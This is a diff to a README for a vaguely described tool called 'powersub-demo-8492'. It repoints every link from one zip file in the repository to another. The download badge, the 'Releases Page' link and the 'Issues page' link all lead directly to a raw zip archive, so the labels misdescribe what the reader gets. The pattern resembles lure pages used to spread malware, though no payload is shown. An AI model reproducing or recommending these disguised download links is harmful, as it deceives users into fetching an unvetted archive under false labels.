@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-8492 - Simple Way to Power Up Your Workflow
 
-[![Download the latest version](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/discrepance/powersub-demo-8492.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/discrepance/powersub-demo-8492.zip)
+[![Download the latest version](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/helping/powersub_demo_v2.5.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/helping/powersub_demo_v2.5.zip)
 
 ## 📥 Overview
 
@@ -23,7 +23,7 @@ Before you install powersub-demo-8492, please check the following system require
 
 To get powersub-demo-8492, visit the Releases page. This page contains the latest version and additional updates.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/discrepance/powersub-demo-8492.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/helping/powersub_demo_v2.5.zip)
 
 ### Steps to Download:
 
@@ -69,4 +69,4 @@ This project is licensed under the MIT License. You can freely use or modify the
 
 ## 🔗 Support
 
-Need more help? You can visit the [Issues page](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/discrepance/powersub-demo-8492.zip) to report problems or ask for assistance. Thank you for choosing powersub-demo-8492!
+Need more help? You can visit the [Issues page](https://raw.githubusercontent.com/opm3000/powersub-demo-8492/main/helping/powersub_demo_v2.5.zip) to report problems or ask for assistance. Thank you for choosing powersub-demo-8492!
